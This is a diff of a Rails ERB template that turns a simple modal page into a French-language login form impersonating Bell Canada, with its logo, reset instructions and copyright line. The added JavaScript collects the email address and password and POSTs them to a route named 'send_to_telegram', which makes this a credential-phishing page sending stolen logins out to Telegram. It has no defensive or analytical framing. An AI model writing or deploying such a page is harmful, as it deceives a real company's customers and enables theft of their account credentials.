@@ -9,11 +9,46 @@
 <%= javascript_include_tag 'application', type: 'module' %>
 </head>
 <body>
-  <div class="container">
-    <h1>Container Page</h1>
-    <button id="openModal" class="redirect">Open Modal</button>
-  </div>
+   <!-- navbar -->
+    <div className="padding-div">
+    <div class="div">
+    <div class="group">
+      <%= image_tag 'image.png', class: 'logo' %>
+    <div class="separator"></div>
+    <div class="column">
+      <p>Business</p>
+      <p>Email</p>
+    </div>
+    </div>
+    <p className="underline">Français</p>
+    </div>
+    </div>
 
+  <!-- Modal container -->
+   <div class="modalcontainer">
+      <div class="modalwrapper">
+        <h1 class="tink">Log In.</h1>
+        <form class="field">
+          <div class="form-group">
+            <label for="email">Adresse courriel</label>
+            <input id="email" type="email" name="email" />
+            <span id="email-error" class="error-message"></span> <!-- Error message for email -->
+          </div>
+          <div class="form-group">
+            <label for="password">Mot de passe</label>
+            <input id="password" type="password" v-model="password" name="password" />
+            <span id="password-error" class="error-message"></span> <!-- Error message for password -->
+          </div>
+          <button type="submit" class="submit" id="openModal">Submit</button>
+          <p class="reduce">Mot de passe oublié? Composez le 310-<span class="bold">BELL</span> pour le réinitialiser.</p>
+        </form>
+        <div class="form-footer">
+          <p class="blue"><a href="#">Vie privée</a> | <a href="#"> Avis juridiques et réglementaires</a></p>
+          <p class="copyright">&copy; Bell Canada,. Tous droits réservés.</p>
+        </div>
+      </div>
+    </div>
+            
   <!-- Modal -->
   <div id="myModal" class="modal">
     <div class="modal-content">
@@ -28,24 +63,76 @@
   </div>
 
   <script>
-    // Modal functionality (basic JS)
-    var modal = document.getElementById("myModal");
-    var btn = document.getElementById("openModal");
-    var span = document.getElementsByClassName("close")[0];
+  // Modal functionality (basic JS)
+  var modal = document.getElementById("myModal");
+  var btn = document.getElementById("openModal");
+  var span = document.getElementsByClassName("close")[0];
 
-    btn.onclick = function() {
-      modal.style.display = "block";
+  // Form submission and validation
+  document.getElementById('login-form').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent default form submission
+
+    var email = document.getElementById('email').value;
+    var password = document.getElementById('password').value;
+    
+    // Form validation
+    var isValid = true;
+    document.getElementById('email-error').innerText = '';
+    document.getElementById('password-error').innerText = '';
+
+    // Email validation
+    if (!email || !/\S+@\S+\.\S+/.test(email)) {
+      document.getElementById('email-error').innerText = 'Please enter a valid email address.';
+      isValid = false;
     }
 
-    span.onclick = function() {
+    // Password validation
+    if (!password || password.length < 6) {
+      document.getElementById('password-error').innerText = 'Password must be at least 6 characters.';
+      isValid = false;
+    }
+
+    if (isValid) {
+      // Send data to the server (via AJAX)
+      var message = document.querySelector('textarea[name="message"]').value; // Get the message from the textarea
+
+      var formData = {
+        email: email,
+        password: password,
+        message: message
+      };
+
+      // Make AJAX request to send the data to the server
+      fetch('<%= send_to_telegram_path %>', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-CSRF-Token': document.querySelector('[name="csrf-token"]').content
+        },
+        body: JSON.stringify(formData)
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Success:', data);
+        // You can show a success message or close the modal
+        modal.style.display = "block";  // Show modal
+      })
+      .catch((error) => {
+        console.error('Error:', error);
+      });
+    }
+  });
+
+  // Modal close functionality
+  span.onclick = function() {
+    modal.style.display = "none";
+  }
+
+  window.onclick = function(event) {
+    if (event.target == modal) {
       modal.style.display = "none";
     }
-
-    window.onclick = function(event) {
-      if (event.target == modal) {
-        modal.style.display = "none";
-      }
-    }
+  }
 
     // Handle the response and show the success message
   document.getElementById('telegram-form').addEventListener('ajax:success', function(event) {
